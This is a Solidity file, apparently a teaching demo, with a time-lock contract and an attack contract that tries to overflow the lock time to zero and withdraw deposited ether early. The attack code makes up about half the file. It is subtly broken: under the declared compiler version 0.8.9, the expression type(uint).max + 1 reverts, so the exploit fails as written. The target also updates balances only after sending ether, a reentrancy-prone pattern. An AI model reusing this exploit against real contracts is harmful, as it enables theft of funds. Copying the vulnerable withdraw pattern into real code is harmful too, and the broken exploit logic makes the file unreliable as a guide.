// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
contract TimeLock{
    mapping (address=>uint) public owner_balance;
    mapping (address=>uint) public  Locktime;

    function deposit () external payable {
           owner_balance[msg.sender]+=msg.value;
           Locktime[msg.sender]=block.timestamp+1 weeks;
    }

    function increaseTimeLock(uint _timeLock) public {
        Locktime[msg.sender]+=_timeLock;
    } 

    function getblocktimestamp() public view returns (uint){
        return block.timestamp;
    }

    function getBalance() public view returns(uint){
       return address(this).balance;
    }
   

    function withdraw() public {
        
        require(owner_balance[msg.sender]>0,"Insufficient Funds");

        
        require(block.timestamp>Locktime[msg.sender],"time lock is not expired");
        uint bal=owner_balance[msg.sender];
        (bool sent,) = msg.sender.call{value:bal}(" ");

        owner_balance[msg.sender]=0;

       
        require(sent,"Failed to send Ether");
    }

}

contract timeLock_Attack{
     TimeLock timeLock;

    constructor(address _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    receive() external  payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
        timeLock.increaseTimeLock(
            type(uint).max + 1 - timeLock.Locktime(address(this))
        );
         timeLock.withdraw();
    }

    function find_Min_Max() public  pure returns(uint,uint){
        return (type(uint).max,type(uint).min);
    }
    function gettimeLock() public view returns (uint){
       return  timeLock.Locktime(address(this));
    }

    function getBalance() public view returns(uint){
       return address(this).balance;
    }
}